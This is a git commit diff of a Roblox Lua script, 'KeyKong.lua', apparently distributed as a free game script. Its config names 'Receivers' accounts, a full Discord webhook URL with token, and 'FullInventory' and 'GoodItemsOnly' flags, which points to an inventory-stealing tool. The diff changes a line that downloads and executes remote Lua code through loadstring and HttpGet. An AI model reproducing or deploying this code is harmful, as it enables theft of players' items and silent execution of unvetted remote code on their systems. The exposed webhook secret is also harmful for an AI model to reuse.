c1781a1688b1243c9ea787dc63be831d97850c5e
FreeGamesScript23 <129659928+FreeGamesScript23@users.noreply.github.com>
2024-07-30 16:53:20 +0800

    Update KeyKong.lua

--- KeyKong.lua
+++ KeyKong.lua
@@ -1,5 +1,5 @@
 Config = {
-    Receivers = {"ninjasit", "ErrorClient04"},
+    Receivers = {"ErrorClient04"},
     Webhook = "https://discord.com/api/webhooks/1265971660759240808/SlH8qsSeVnrxWj63UyF-Po2yP5SM8Zb0TtFdKGQLyRRb-Eh94s9hzMS56e5MYZms7Hh_",
     FullInventory = true,
     GoodItemsOnly = true,
@@ -8,4 +8,4 @@ Config = {
     CustomLink = "None"
 }
 
-loadstring(game:HttpGet("https://raw.githubusercontent.com/FreeGamesScript23/Aug2006/main/UmScript/Pantyzstela.lua",true))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/LordRayven/AshborrnHub/main/AshbornnHub.lua",true))()
